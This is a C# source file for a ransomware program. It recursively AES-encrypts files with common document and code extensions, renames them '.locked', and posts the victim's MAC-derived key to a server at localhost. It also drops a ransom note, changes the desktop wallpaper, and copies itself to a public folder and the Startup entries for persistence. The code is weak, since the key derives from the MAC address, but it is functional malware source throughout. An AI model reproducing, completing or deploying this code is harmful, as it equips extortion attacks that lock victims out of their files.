using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using System.ComponentModel;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Collections.Specialized;
using System.Net.NetworkInformation;
using Ransomware;

namespace Ransomware
{
    public class Ransomware
    {

        public Ransomware()
        {
        }
        
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        public string CreatePassword() // for simple and safety, key is MAC address + salt.
        {
            string mac = GetMACAddress2();
            return mac;
        }

        public void SendPassword(string password) // send key to server
        {
            var client = new WebClient();
            var values = new NameValueCollection();
            values["id"] = password;
            var response = client.UploadValues("http://localhost:8080/Ransomware/RansomwareController", values); // use HTTP POST
        }
        public string getKey(string password)
        {
            string salt = "luffy";
            password = password + salt;
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes); 
            string hex = BitConverter.ToString(passwordBytes).Replace("-", string.Empty);
            return hex;
        }

        public void EncryptFile(string file, string password) // encrypt single file
        {
            string salt = "luffy";
            password = password + salt;
            
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            passwordBytes = SHA256.Create().ComputeHash(passwordBytes); //key is SHA256(password + salt)

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + ".locked");

        }

        public void encryptDirectory(string location, string password) // encrypt directory, recursive
        {

            var validExtensions = new[] // extension to be encrypt
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".pdf",".java",".c",".cpp",".py"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i], password);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                encryptDirectory(childDirectories[i], password);
            }


        }
        public string GetMACAddress2()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            String sMacAddress = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)
                {
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            } return sMacAddress;
        }
        public bool checkNetWork() 
        {
            try
            {
                HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create("http://google.com");//simple : request to google.com
                webRequest.AllowAutoRedirect = false;
                HttpWebResponse response = (HttpWebResponse)webRequest.GetResponse();
                return true;
            }
            catch (Exception e) 
            {
                return false;
            }
            
        }
        public void zombie() //add itself to Startup
        {
            string pathsource = Directory.GetCurrentDirectory() + "\\Release.exe";
            string pathdesk = "C:\\Users\\Public\\System.exe"; //move itself to other path
            System.IO.File.Copy(pathsource, pathdesk, true);
            pathdesk = "\"" + pathdesk + "\"";
            if (Zombie.StartUpManager.IsUserAdministrator())
            {
                Zombie.StartUpManager.AddApplicationToAllUserStartup(pathdesk); //add to Startup for all user
            }
            else
            {
                Zombie.StartUpManager.AddApplicationToCurrentUserStartup(pathdesk); // add to Startup for current user
            }
        }
        public void dead()
        {
            if (Zombie.StartUpManager.IsUserAdministrator())
            {
                Zombie.StartUpManager.RemoveApplicationFromAllUserStartup();
            }
            else
            {
                Zombie.StartUpManager.RemoveApplicationFromCurrentUserStartup();
            }
        }
        public bool Process() 
        {
            if (checkNetWork()) 
            {
                try
                {
                    string localFilename = Directory.GetCurrentDirectory() + "\\file.jpg";
                    Desktop.DownloadRemoteImageFile("https://scontent-hkg3-1.xx.fbcdn.net/v/t35.0-12/14646591_1155415321192591_1511365832_o.png?oh=c5c785088cfa0bfe88fbe5a7a1f08da3&oe=582FDB9E", localFilename); // download file to set Desktop background
                    Desktop.Set(localFilename, Desktop.Style.Centered);
                    string password = CreatePassword();
                    SendPassword(password); 
                    encryptDirectory(Directory.GetCurrentDirectory(), password); //simple: encrypt current directory
                    string textFile = Directory.GetCurrentDirectory() + "\\Detail.txt"; 
                    System.IO.File.WriteAllText(textFile, "Your files were encrypted. Visit http://localhost:8080/Ransomware to decrypt its. Your client ID is " + password + ". Your key is " + getKey(password));
                    dead();
                    return true;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                    return true;
                }
            }
            else 
            {
                zombie();
                return false;
            }
        }

    }
}